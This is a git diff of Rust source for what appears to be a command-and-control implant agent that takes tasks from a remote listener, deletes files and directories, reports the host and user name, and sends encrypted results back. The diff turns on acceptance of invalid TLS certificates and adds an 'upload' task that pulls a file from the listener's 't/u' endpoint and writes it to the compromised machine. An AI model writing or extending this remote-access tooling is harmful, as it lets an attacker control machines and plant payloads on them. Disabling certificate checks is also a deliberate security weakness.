@@ -7,6 +7,7 @@ use std::{
     time,
     process::Command
 };
+use url::Url;
 use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret, StaticSecret};
 
 use crate::{
@@ -66,7 +67,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
         .use_rustls_tls()
         .identity(client_id)
         .add_root_certificate(root_cert)
-        // .danger_accept_invalid_certs(true)
+        .danger_accept_invalid_certs(true)
         .build()
         .unwrap();
 
@@ -494,7 +495,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     match std::fs::remove_file(task_args[1].as_str()) {
                         Ok(_) => {
                             post_task_result(
-                                "The directory removed successfully.".as_bytes(),
+                                "File removed successfully.".as_bytes(),
                                 agent_name.to_string(),
                                 listener_url.to_string(),
                                 headers.clone(),
@@ -520,7 +521,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     match std::fs::remove_dir_all(task_args[1].as_str()) {
                         Ok(_) => {
                             post_task_result(
-                                "The directory removed successfully.".as_bytes(),
+                                "Directory removed successfully.".as_bytes(),
                                 agent_name.to_string(),
                                 listener_url.to_string(),
                                 headers.clone(),
@@ -608,6 +609,82 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     &client,
                 ).await;
             }
+            "upload" => {
+                let file_to_download = task_args[1].to_string();
+                let mut dest = task_args[2].to_string();
+                // Adjust dest path
+                if dest.as_str() == "." {
+                    dest = file_to_download.split("/").last().unwrap().to_string();
+                }
+
+                let resp_data = match download(
+                    file_to_download.as_bytes(),
+                    agent_name.to_string(),
+                    listener_url.to_string(),
+                    headers.clone(),
+                    config.my_secret_key.clone(),
+                    config.server_public_key.clone(),
+                    &client,
+                ).await {
+                    Ok(d) => d,
+                    Err(e) => {
+                        post_task_result(
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+
+                        continue;
+                    }
+                };
+
+                let mut f = match fs::File::create(dest) {
+                    Ok(f) => f,
+                    Err(e) => {
+                        post_task_result(
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+
+                        continue;
+                    }
+                };
+
+                match f.write_all(&resp_data) {
+                    Ok(_) => {
+                        post_task_result(
+                            "Uploaded file successfully.".as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                }
+
+            }
             "whoami" => {
                 let username = format!("{}@{}", whoami::hostname(), whoami::username());
                 post_task_result(
@@ -651,4 +728,35 @@ async fn post_task_result(
         .json(&cipherdata)
         .send()
         .await;
+}
+
+async fn download(
+    plaindata: &[u8],
+    agent_name: String,
+    listener_url: String,
+    headers: HeaderMap,
+    my_secret_key: StaticSecret,
+    server_public_key: PublicKey,
+    client: &reqwest::Client,
+) -> Result<Vec<u8>, Error> {
+    let cipherdata = CipherData::new(
+        agent_name,
+        plaindata,
+        my_secret_key,
+        server_public_key,
+    );
+
+    let resp = client
+        .post(format!("{}{}", listener_url, "t/u"))
+        .headers(headers)
+        .json(&cipherdata)
+        .send()
+        .await
+        .unwrap()
+        .bytes()
+        .await
+        .unwrap()
+        .to_vec();
+
+    Ok(resp)
 }
